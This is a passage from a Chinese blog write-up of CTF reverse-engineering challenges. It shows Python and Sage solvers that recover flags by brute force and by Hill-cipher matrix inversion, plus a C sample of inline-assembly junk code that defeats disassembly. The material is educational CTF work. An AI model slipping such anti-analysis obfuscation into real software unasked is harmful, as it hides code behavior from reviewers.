class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>,<span class="number">0</span>,<span class="number">0x4058A</span>,<span class="number">0</span>]</span><br><span class="line">heap = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">print(len(table))</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(table)):</span><br><span class="line">    j = <span class="number">10</span> - table[i]</span><br><span class="line">    tmp =  heap[j]</span><br><span class="line">    <span class="keyword">if</span> tmp == <span class="number">0</span>:</span><br><span class="line">        flag += <span class="string">'1'</span></span><br><span class="line">        heap[j] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> heap[j] == <span class="number">1</span>:</span><br><span class="line">        flag += <span class="string">'0'</span></span><br><span class="line">        heap[j] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(len(heap)):</span><br><span class="line">        <span class="keyword">if</span> heap[k]==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> k==<span class="number">9</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"i---&gt;"</span>+hex(i)</span><br><span class="line">            <span class="keyword">print</span> table[i]</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="comment">#0010001101100011001000110110011100100111011000110010001101100111001000110110001100100111011001110010011101100011001001110110011100100011011000110010011101100111001001110110001100100011011001110010001101100011001000110110011100100111011000110010011101100111001000110110001100100011011001110010011101100011001000110110011100100011011000110010001101100111001001110110001100100111011001110010001101100011001001110110011100100111011000110010001101100111001000110110001100100111011001110010011101100011001001110110011100100011011000110010001101100111001001110110001100100011011001110010001101100011001000110110011100100111011000110010011101100111001000110110001100100111011001110010011101100011001000110110011100100011011000110010001101100111001001110110001100100111011001110010001101100011001000110110011100100111011000110010001101100111001000110110001100100</span></span><br></pre></td></tr></table></figure>

<p>通过调试打印值可以发现在第852次就实现了全部变为0，所以输入就可以确定了</p>
<p>最后检验下</p>
<p><img src="/blog_img/image-20210120225442349.png" alt="image-20210120225442349"></p>
<h4 id="3、stream"><a href="#3、stream" class="headerlink" title="3、stream"></a>3、stream</h4><p>先来看看程序的输入输出，打开失败，好像要有输入文件</p>
<p><img src="/blog_img/image-20210121203833461.png" alt="image-20210121203833461"></p>
<p>ida查找字符调试一波：</p>
<p><img src="/blog_img/image-20210121203913746.png" alt="image-20210121203913746"></p>
<p>交叉引用定位过去main函数的主要操作：</p>
<p><img src="/blog_img/image-20210121204011034.png" alt="image-20210121204011034"></p>
<p>因为看不太懂rust语言，然后干脆直接动态调试查看逻辑好了,发现会打开flag文件，然后读取里面的字符，继续分析，先来看看一个随机数函数的生成：</p>
<p><img src="/blog_img/image-20210121212058751.png" alt="image-20210121212058751"></p>
<p>这里经过动态调试发现传进去的flag的一个值作为一个种子进行了随机数的生成，然后随机数存储到stack上，然后这个值进行了异或加密存回去，然后pi的值加了7，第二次时，把前一次的种子和新种子放到一起进行加密生成随机数，这里可以知道每一次要进行随机数加密取的种子下标顺序：i</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pi = <span class="number">4</span></span><br><span class="line">i = pi % len</span><br><span class="line">pi + <span class="number">7</span></span><br></pre></td></tr></table></figure>

<p>这里可以知道因为是单字节加密，然后取明文的累积作为key生成的一个种子，所以知道了输入就知道了随机数。但是功底太差了，看不懂随机数是怎么生成的，只是知道了怎么加密的现在，继续分析：</p>
<p><img src="/blog_img/image-20210121225632781.png" alt="image-20210121225632781"></p>
<p>最后是打开output文件，将加密后的密文放进去。</p>
<p>这里逻辑已经比较清楚了，我们要做的就是写个爆破脚本去一一碰撞check的密文即可，这里因为不同的明文值加密得到的可能是相同的密文值(动态调试结合写脚本尝试爆破时知道的)，所以实际上是一棵树深度搜索的过程！只有一个可能是正确的或者说可能出现多解也不一定，反正能走到最后的根节点的都试试，自己写个脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># enc = []</span></span><br><span class="line"><span class="comment"># with open("check","rb+") as f:</span></span><br><span class="line"><span class="comment"># 	a = f.read()</span></span><br><span class="line"><span class="comment"># 	for i in a:</span></span><br><span class="line"><span class="comment"># 		enc.append(ord(i))</span></span><br><span class="line"><span class="comment"># print enc</span></span><br><span class="line">enc = [<span class="number">154</span>, <span class="number">122</span>, <span class="number">66</span>, <span class="number">146</span>, <span class="number">60</span>, <span class="number">227</span>, <span class="number">27</span>, <span class="number">164</span>, <span class="number">184</span>, <span class="number">114</span>, <span class="number">150</span>, <span class="number">47</span>, <span class="number">1</span>, <span class="number">152</span>, <span class="number">94</span>, <span class="number">41</span>, <span class="number">34</span>, <span class="number">245</span>, <span class="number">154</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">76</span>, <span class="number">24</span>, <span class="number">42</span>, <span class="number">56</span>, <span class="number">65</span>, <span class="number">212</span>, <span class="number">243</span>, <span class="number">169</span>, <span class="number">232</span>, <span class="number">96</span>, <span class="number">238</span>, <span class="number">218</span>, <span class="number">3</span>, <span class="number">220</span>, <span class="number">28</span>, <span class="number">161</span>, <span class="number">134</span>, <span class="number">18</span>, <span class="number">254</span>, <span class="number">24</span>, <span class="number">66</span>, <span class="number">137</span>, <span class="number">128</span>, <span class="number">145</span>, <span class="number">220</span>]</span><br><span class="line">idx = <span class="number">4</span></span><br><span class="line">flag = <span class="string">"flag&#123;ffffffffffffffffffffffffffffffffffffffff&#125;"</span></span><br><span class="line">queue  = [&#123;<span class="string">"idx"</span>:idx,<span class="string">"flag"</span>:flag&#125;]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	one = queue.pop()</span><br><span class="line">	idx = one[<span class="string">"idx"</span>]</span><br><span class="line">	flag = one[<span class="string">"flag"</span>]</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>,<span class="number">0x7f</span>,<span class="number">1</span>):</span><br><span class="line">		temp = flag[:idx]+chr(i)+flag[idx+<span class="number">1</span>:]</span><br><span class="line">		<span class="comment"># print temp</span></span><br><span class="line">		<span class="keyword">with</span> open(<span class="string">"flag"</span>,<span class="string">"wb+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">			f.write(temp)</span><br><span class="line">			f.close()</span><br><span class="line">		os.system(<span class="string">'./a'</span>)</span><br><span class="line">		<span class="keyword">with</span> open(<span class="string">"output"</span>,<span class="string">'rb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">			c = f.read()</span><br><span class="line">			f.close()</span><br><span class="line">			ce = ord(c[idx])</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				<span class="keyword">if</span> ce==enc[idx]:</span><br><span class="line">					new = [&#123;<span class="string">"idx"</span>:(idx+<span class="number">7</span>)%<span class="number">46</span>,<span class="string">"flag"</span>:temp&#125;]</span><br><span class="line">					<span class="comment"># print new</span></span><br><span class="line">					queue += new</span><br><span class="line">			<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">	<span class="comment">#final</span></span><br><span class="line">	<span class="keyword">if</span> idx==<span class="number">43</span>:</span><br><span class="line">		<span class="keyword">print</span> flag </span><br><span class="line"><span class="comment"># *ctf&#123;EbXZCOD56vEHNSofFvRHG7XtgFJXcUXUGnaaaaaa&#125;</span></span><br></pre></td></tr></table></figure>



<p><img src="/blog_img/image-20210121230732861.png" alt="image-20210121230732861"></p>
<p>其实我还想到用之前自己做的钩子程序，直接测试函数片段，把那个随机数生成函数提取出来，做逆向也可以(理论上)，但是现在这种做法这样也不会慢到哪里去所以还是可以的，不说了，ex师傅牛逼！加深了自己对于深度搜索的学习，get新技能。</p>
<h4 id="4、wherekey"><a href="#4、wherekey" class="headerlink" title="4、wherekey"></a>4、wherekey</h4><p>这道题因为是静态编译的文件，所以我们先通过strings过滤字符串得知是ubuntu20下的程序，于是导入符号signal，恢复一下符号表，接着在通过字符串定位主逻辑时，f5时发现有花指令，这里去花指令的操作也比较简单，就是先定位到一大堆的机器码那里，先c一下，然后看跳转，接着nop掉没用的指令，然后将函数整体先u再p就可以实现f5的反编译了，去花完成得到主逻辑如下：</p>
<p><img src="/blog_img/image-20210128100624676.png" alt="image-20210128100624676"></p>
<p>这里是通过tty和socket进行UDP交互的，绑定的8888端口</p>
<p><img src="/blog_img/image-20210128102950566.png" alt="image-20210128102950566"></p>
<p>直接运行时没有问题的，select时选择的是本地的输入输出，在进行动态调试时，我们需要通过</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -u <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p>向调试程序发送输入的数据，然后在recvfrom时就会接收到我们的数据</p>
<p><img src="/blog_img/image-20210128104208217.png" alt="image-20210128104208217"></p>
<p><img src="/blog_img/image-20210128105315719.png" alt="image-20210128105315719"></p>
<p>接着主要逻辑就在0x4022de中，继续分析</p>
<p><img src="/blog_img/image-20210128104323105.png" alt="image-20210128104323105"></p>
<p><img src="/blog_img/image-20210128104339015.png" alt="image-20210128104339015"></p>
<p>这里初始化init时会将输入处理好：</p>
<p><img src="/blog_img/image-20210128104414561.png" alt="image-20210128104414561"></p>
<p>可以得到每行取5个值：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string=<span class="string">'flag&#123;are_you_sure_friend&#125;'</span></span><br><span class="line">num=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        num.append(ord(string[<span class="number">5</span> * j + i]))</span><br></pre></td></tr></table></figure>

<p>然后继续func函数处理，这里是将init里面的值和输入的值进行了乘法运算再相加，这里可以猜测是矩阵的乘法运算：</p>
<p><img src="/blog_img/image-20210128104456524.png" alt="image-20210128104456524"></p>
<p>乘完取余再存储到table中，以矩阵的形式，最后进行了cmp比较</p>
<p><img src="/blog_img/image-20210128104614268.png" alt="image-20210128104614268"></p>
<p>我们可以提取出密文crypto：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enc=[<span class="number">0x38</span>, <span class="number">0x6D</span>, <span class="number">0x4B</span>, <span class="number">0x4B</span>, <span class="number">0xB9</span>, <span class="number">0x8A</span>, <span class="number">0xF9</span>, <span class="number">0x8A</span>, <span class="number">0xBB</span>, <span class="number">0x5C</span>, <span class="number">0x8A</span>, <span class="number">0x9A</span>, <span class="number">0xBA</span>, <span class="number">0x6B</span>, <span class="number">0xD2</span>, <span class="number">0xC6</span>, <span class="number">0xBB</span>, <span class="number">0x05</span>, <span class="number">0x90</span>, <span class="number">0x56</span>, <span class="number">0x93</span>, <span class="number">0xE6</span>, <span class="number">0x12</span>, <span class="number">0xBD</span>, <span class="number">0x4F</span>]</span><br></pre></td></tr></table></figure>

<p>分析到这里其实已经比较明显了，就是个hill加密，所以我们要做的就是找到那个A的逆矩阵即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag*A=C</span><br><span class="line">flag*A*(A^<span class="number">-1</span>)=C*(A^<span class="number">-1</span>)</span><br><span class="line">flag=C*(A^<span class="number">-1</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Sage求解</span></span><br><span class="line">A = Matrix(GF(<span class="number">257</span>),[[<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>], [<span class="number">97</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">121</span>], [<span class="number">111</span>, <span class="number">117</span>, <span class="number">95</span>, <span class="number">115</span>, <span class="number">117</span>], [<span class="number">114</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">102</span>, <span class="number">114</span>], [<span class="number">105</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">125</span>]])</span><br><span class="line"></span><br><span class="line">encode =  Matrix(GF(<span class="number">257</span>),[[<span class="number">56</span>, <span class="number">109</span>, <span class="number">75</span>,<span class="number">75</span>,<span class="number">185</span>], [<span class="number">138</span> ,<span class="number">249</span>, <span class="number">138</span>, <span class="number">187</span>,  <span class="number">92</span>],[<span class="number">138</span>, <span class="number">154</span> ,<span class="number">186</span>, <span class="number">107</span>, <span class="number">210</span>],[<span class="number">198</span>, <span class="number">187</span>,   <span class="number">5</span>, <span class="number">144</span>,  <span class="number">86</span>],[<span class="number">147</span>, <span class="number">230</span>,  <span class="number">18</span>, <span class="number">189</span>,  <span class="number">79</span>]])</span><br><span class="line"></span><br><span class="line">flag = encode*A.inverse()</span><br></pre></td></tr></table></figure>

<p>得到flag转成字符：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*CTF&#123;Ha23_f0n_9nd_G0od<span class="number">-1u</span>ck-OH&#125;</span><br></pre></td></tr></table></figure>

<p>鉴于之前花指令和内嵌汇编做的少，这里也刚好可以学习一下操作，我看了下源码，大概了解了怎么使用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JUNKCODE          \</span></span><br><span class="line">	__asm__ __volatile__( \</span><br><span class="line">		<span class="string">"jmp junk1\n\t"</span>   \</span><br><span class="line">		<span class="string">".byte 0x12\n\t"</span> \</span><br><span class="line">		<span class="string">" junk2 : \n\t"</span>   \</span><br><span class="line">		<span class="string">"ret \n\t"</span>        \</span><br><span class="line">		<span class="string">".byte 0x34\n\t"</span> \</span><br><span class="line">		<span class="string">"junk1 : \n\t"</span>    \</span><br><span class="line">		<span class="string">"call junk2\n\t"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JUNKCODE2 __asm__ __volatile__( \</span></span><br><span class="line">	<span class="string">".byte 0x75\n\t"</span>                    \</span><br><span class="line">	<span class="string">".byte 0x2\n\t"</span>                     \</span><br><span class="line">	<span class="string">".byte 0xE9\n\t"</span>                    \</span><br><span class="line">	<span class="string">".byte 0xED\n\t"</span>);</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">read</span>(<span class="number">0</span>,buf,<span class="number">100</span>);</span><br><span class="line">	JUNKCODE</span><br><span class="line">  JUNKCODE2</span><br><span class="line">	<span class="built_in">write</span>(<span class="number">1</span>,buf,<span class="number">100</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>内嵌汇编的形式加入到里面，其实也可以在pwn中相当于自己提前加想要的gadget，花指令可以起到扰乱逆向工程师分析的目的，同时sage在逆向中的运用还是可以学习一下的，在ubuntu装一个sage，以后也可以用：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install sagemath-common</span><br></pre></td></tr></table></figure>




            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls"
                data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
            <ul id="audio-list" style="display:none">
                
                
                <li title='0' data-url='/statics/chengdu.mp3'></li>
                
                    
            </ul>
            
            
            
    <div id='gitalk-container' class="comment link"
        data-ae='true'
        data-ci='ec894e2b66f752e8b7fb'
        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
        data-r='blog-comments'
        data-o='TriDiamond'
        data-a='TriDiamond'
        data-d=''
    >Comments</div>


            
            
        </div>
        <div class="sidebar">
            <div class="box animated fadeInRight">
                <div class="subbox">
                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
                    <p>V1ct0r</p>
                    <span>Where there is a will,there is a way！</span>
                    <dl>
                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
                                    class=" iconfont icon-github"></span></a></dd>
                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
                                    class=" iconfont icon-twitter"></span></a></dd>
                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
                                    class=" iconfont icon-stack-overflow"></span></a></dd>
                    </dl>
                </div>
                <ul>
                    <li><a href="/">92 <p>Articles</p></a></li>
                    <li><a href="/categories">20 <p>Categories</p></a></li>
                    <li><a href="/tags">82 <p>Tags</p></a></li>
                </ul>
            </div>
            
            
            
            <div class="box sticky animated fadeInRight faster">
                <div id="toc" class="subbox">
                    <h4>Contents</h4>
                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、PWN"><span class="toc-number">1.</span> <span class="toc-text">一、PWN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、babypac"><span class="toc-number">2.</span> <span class="toc-text">2、babypac</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、RE"><span class="toc-number">3.</span> <span class="toc-text">二、RE</span></a></li></ol>
                </div>
            </div>
            
            
        </div>
    </div>
</div>

    </div>
</div>
    <div id="back-to-top" class="animated fadeIn faster">
        <div class="flow"></div>
        <span class="percentage animated fadeIn faster">0%</span>
        <span class="iconfont icon-top02 animated fadeIn faster"></span>
    </div>
</body>
<footer>
    <p class="copyright" id="copyright">
        &copy; 2021
        <span class="gradient-text">
            V1ct0r
        </span>.
        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
        Theme
        <span class="gradient-text">
            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
        </span>
        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
    </p>
</footer>

<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<script>
  MathJax.Hub.Config({
    "HTML-CSS": {
      preferredFont: "TeX",
      availableFonts: ["STIX", "TeX"],
      linebreaks: {
        automatic: true
      },
      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
      inlineMath: [
        ["$", "$"],
        ["\\(", "\\)"]
      ],
      processEscapes: true,
      ignoreClass: "tex2jax_ignore|dno",
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
      noUndefined: {
        attributes: {
          mathcolor: "red",
          mathbackground: "#FFEEEE",
          mathsize: "90%"
        }
      },
      Macros: {
        href: "{}"
      }
    },
    messageStyle: "none"
  });
</script>
<script>
  function initialMathJax() {
    MathJax.Hub.Queue(function () {
      var all = MathJax.Hub.getAllJax(),
        i;
      // console.log(all);
      for (i = 0; i < all.length; i += 1) {
        console.log(all[i].SourceElement().parentNode)
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  }

  function reprocessMathJax() {
    if (typeof MathJax !== 'undefined') {
      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
    }
  }
</script>



    
<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">

    
<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>



<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/obsidian.js"></script>
<script src="/js/jquery.truncate.js"></script>
<script src="/js/search.js"></script>


<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>


<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>


<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>


<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>

    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>




    
<script src="/js/busuanzi.min.js"></script>

    <script>
        $(document).ready(function () {
            if ($('span[id^="busuanzi_"]').length) {
                initialBusuanzi();
            }
        });
    </script>



<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">


<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>



    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-149874671-1');
    </script>





<script>
    function initialTyped () {
        var typedTextEl = $('.typed-text');
        if (typedTextEl && typedTextEl.length > 0) {
            var typed = new Typed('.typed-text', {
                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
                typeSpeed: 90,
                loop: true,
                loopCount: Infinity,
                backSpeed: 20,
            });
        }
    }

    if ($('.article-header') && $('.article-header').length) {
        $(document).ready(function () {
            initialTyped();
        });
    }
</script>




</html>
